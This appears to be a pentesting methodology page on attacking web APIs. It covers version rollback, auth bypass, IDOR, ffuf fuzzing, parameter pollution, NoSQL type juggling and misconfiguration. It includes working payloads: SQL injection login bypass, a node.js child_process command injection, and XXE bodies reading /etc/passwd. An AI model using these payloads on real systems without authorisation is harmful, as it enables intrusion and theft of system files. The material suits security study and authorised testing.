# API Hacking

An API (Application Programming Interface) is an interface within an application that specifies how the application can interact with other applications. In the case of web applications, it is what allows remote access to the functionality of back-end components. APIs are not unique to web applications and are used for software applications in general. Web APIs are typically accessed through the HTTP protocol and are usually managed and translated through web servers.

## Theory

{% content-ref url="theory-api-hacking.md" %}
[theory-api-hacking.md](theory-api-hacking.md)
{% endcontent-ref %}

## Practice

### 1. Obtain API documentation

This can be obtained by asking the API developers, or if it is a public API, we can use Google or search in tools like [Censys.io](http://censys.io) , [any-api.com](http://any-api.com) and [Virustotal.com](http://virustotal.com) that will be useful.

If it is not possible to get an API documentation (most of the time in CTFs and rarely in real life), we will have to play with it manually, applying fuzzing.

### 2. Change API Version

You can find different API versions manually by changing the version ID. Try changing the version from `v2` to `v1`. Observe the API behavior with different versions. The older version will be more vulnerable.

### 3. Broken Authentication

Most modern APIs use different **authentication methods** for the **mobile** and **web** APIs. Test both APIs differently and try to bypass the authentication method. Example : `/api/v3/login` and `/api/app/login`.

Also, try to perform user and password enumeration, depending on what the API allows.

Typically, some API endpoints will need more privileges than others. Always try to access the more privileged endpoints from less privileged (unauthorized) accounts to see if it is possible.

### 4. Injection

Testing for SQL, NoSQL and command injection. You can trick the interpreter to execute unwanted commands without proper authorization. Also test XSS, HTML injections (if we can see the result on the web page).

Example of some injections through an API:

```bash
GET /v1/users.php?format=json&username=test'+or+'1'='1'--+-&password=test '# Authentication bypass via SQLi
GET /v1/users.php?format=json&token=2121839ksdjabnsklatads'union+select+1,version(),3,4,5--+- '# SQLi
POST /api/books?cmd=require("child_process").exec('ping%20-c%201%2010.10.10.10') # Command injection (node.js)
```

### 5. IDOR

Always check the IDOR. Object-level authorization checks should be considered on all functions that access a data source using user input. It is important to do these checks as sometimes an application or certain resource is locked, but through the API we can "bypass" it.

### 6. Patterns

Look for API patterns inside the api and try to use it to discover more. If you find `/api/albums/<album_id>/photos/<photo_id>` you can also try things like `/api/posts/<post_id>/comment/`. Use some fuzzer to discover these new endpoints.

### 7. Fuzz parameters

We can add them manually or fuzz them:

```bash
ffuf -c -w /opt/SecLists/Discovery/Web-Content/api_endpoints.txt -u "<URL>/api/user?FUZZ=test"
ffuf -c -w /opt/SecLists/Discovery/Web-Content/api_endpoints.txt -u "<URL>/api/user?FUZZ=1"
ffuf -c -w /opt/SecLists/Discovery/Web-Content/api_endpoints.txt -u "<URL>/api/user?FUZZ="
```

{% hint style="info" %}
You can try to **use** parameters **you have seen** in a different endpoints to try to access other information.
{% endhint %}

### 8. Parameter pollution

```shell
/api/account?id=<your account id> # Normal.
/api/account?id=<your account id>&id=<admin's account id> # Modified.
```

### 9. Special chars

Try using the following symbols as wildcards: `*`, `%`, `_`, `.`:

```bash
ffuf -c -w /opt/SecLists/Fuzzing/special-chars.txt -u "<URL>/api/users/FUZZ"
```

### 10. Request content-type

Try to play with the following **content types** (by modifying the request body) to make the web server behave unexpectedly:

```bash
x-www-form-urlencoded --> user=test
application/xml -->  <user>test</user>
application/json -->  {"user": "test"}
```

### 11. Parameters types

If JSON data is working, try sending unexpected data types like:

```bash
{"username": "John"}
{"username": true}
{"username": null}
{"username": 1}
{"username": [true]}
{"username": ["John", true]}
{"username": {"$neq": "lalala"}}
# Any other combination you can imagine.
```

If you can send XML data, check for XXE injections.

If you send normal POST data, try sending arrays and dictionaries:

```bash
username[]=John
username[$neq]=lalala
```

### 12. XML attacks

XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's XML data processing. It often allows an attacker to view files on the application's server file system, and interact with any back-end or external systems that the application itself can access.

When testing the REST API try changing the content type to "`application/xml`" , add the XML request body and see how the request responds. If the error is XML based, you can try for XML entity attacks. Here is an example with a DTD statement:

```xml
PUT /v1/users.php?format=json
Content-Type: application/xml

<?xml version="1.0" standalone="yes"?>
<!DOCTYPE data [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<updatepassword>
    <user>
        <username>&xxe;</username>
        <newpassword>attacker</newpassword>
        <cnfnewpassword>attacker</cnfnewpassword>
        <token>asdj134234jkdxba</token>
    </user>
</updatepassword>
```

However, DTD declarations are normally not allowed in user input. We can use CDATA tags to insert payloads (as long as the XML is valid). Example with SOAP API:

![](../../../.gitbook/assets/soap\_api\_cdata.png)

### 13. HTTP request method change

You can try to use HTTP GET, POST, PUT, DELETE, PATCH, INVENTED methods to try to check if the web server gives you unexpected information with them.

For example, if you found 3 parameters (**json**, **xml** and **id**) in an endpoint that parses XML, you can try to change the GET request to POST, trying to perform an XXE attack:

```xml
POST /api/useraname?xml HTTP/1.1
Host: 10.10.10.10

Content-Type: application/xml
Content-Length: 178

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<poc>
    <example>
    &xxe;
    </example>
</poc>
```

If it does not work, we can try to add to the POST content, the **remaining parameters** (**json** and **id**) by the **XML structure**:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<poc>
    <json>test</json>
    <id>&xxe;</id>
</poc>
```

### 14. API misconfiguration

Check for misconfigured HTTP headers, unnecessary HTTP methods, permissive cross-origin resource sharing (CORS) and detailed error messages containing sensitive information.
